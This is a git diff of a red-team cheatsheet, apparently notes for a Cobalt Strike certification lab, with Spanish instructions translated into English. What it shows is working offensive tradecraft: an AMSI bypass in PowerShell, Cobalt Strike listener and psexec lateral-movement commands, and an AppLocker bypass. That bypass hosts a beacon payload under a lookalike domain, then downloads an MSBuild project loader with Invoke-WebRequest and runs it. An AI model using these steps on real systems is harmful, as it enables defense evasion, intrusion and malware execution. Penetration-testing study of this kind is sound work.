@@ -1,21 +1,10 @@
-
-# IDIOMA
-
 - Cheatsheet extra:
 https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO%20-%20Cheatsheet.md#forest--domain-trusts
 
 
-- Cambiar teclado a español:
-
-```powershell
-$LangList = Get-WinUserLanguageList
-$LangList.Add("es-ES")
-Set-WinUserLanguageList $LangList -Force
-```
-> Vamos a language settings(escribes "**la**" en windows) y seleccionas español.
 # EVASION
 
-## AMSI BYPASS, lanzarlos por separado.
+## AMSI BYPASS, release them separately.
 ```powershell
 #Comando 1
 $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
@@ -145,7 +134,7 @@ process-inject {
 ```bash
 sudo /usr/bin/docker restart cobaltstrike-cs-1
 ```
-If the container fails to restart properly use to see the profile errors:
+If the container fails to restart properly, use to see the profile errors:
 ```bash
 sudo /usr/bin/docker logs cobaltstrike-cs-1
 ```
@@ -154,7 +143,7 @@ sudo /usr/bin/docker logs cobaltstrike-cs-1
 #pipename
 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 
-#Con el set pipename bien configurado, metele este nombre a tu listener
+#Use exactly this format in your listener:
 TSVCPIPE-########-####-####-####-###############
 ```
 
@@ -204,15 +193,15 @@ beacon> jump psexec64 lon-ws-1 smb
 
 ## AppLocker
 
- - Asegurate de hacer todo el bypass anterior, luego hostea un archivo en cobalt:
+ - Make sure you complete all the above bypass steps, then host a file in Cobalt:
 
 ```powershell
-1. Hostea el http_x64.xprocess.bin
-2. Url usa -> www.bleepincomputer.com
-3. the ruta pon beacon.bin
+1. Host the file http_x64.xprocess.bin
+2. URL -> www.bleepincomputer.com
+3. Path -> beacon.bin
 ```
 
-- Luego crea en visual este codigo:
+- Then create this code in Visual Basic:
 ```c
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="MSBuild">
@@ -284,19 +273,19 @@ beacon> jump psexec64 lon-ws-1 smb
 ```
 
 
-- Ve a la ruta de ese archivo y ejecutalo
+- Execute locally. Go to the path of that file and run it.
 
 ```powershell
 C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe .\test.csproj
 ```
 
-- Luego en otra maquina lo puedes hostear el test.csproj en cobal y descargrlo
+- Then you can host the test.csproj file in COBAL on another machine and download it.
 ```powershell
-1. Hosteas con la ruta /test.csproj y url www.bleepincomputer.com
+1. Host and Path -> /test.csproj y url www.bleepincomputer.com
 
-2.  Descargar Invoke-WebRequest -Uri "http://www.bleepincomputer.com:80/test.csproj" -OutFile "test.csproj"
+2. Target machine on Powershell ->   Invoke-WebRequest -Uri "http://www.bleepincomputer.com:80/test.csproj" -OutFile "test.csproj"
 
-3. Ejecutas -> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe .\test.csproj
+3. Excute -> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe .\test.csproj
 ```
 
 ## OPSEC
